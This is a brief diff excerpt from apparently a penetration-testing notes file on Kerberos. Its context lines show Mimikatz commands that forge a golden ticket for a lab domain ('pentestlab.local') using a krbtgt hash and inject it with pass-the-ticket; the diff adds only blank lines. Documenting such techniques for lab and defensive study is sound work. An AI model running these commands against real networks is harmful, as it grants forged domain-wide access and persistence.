@@ -23,3 +23,5 @@ kerberos::purge
 kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
 kerberos::tgt
 ```
+
+
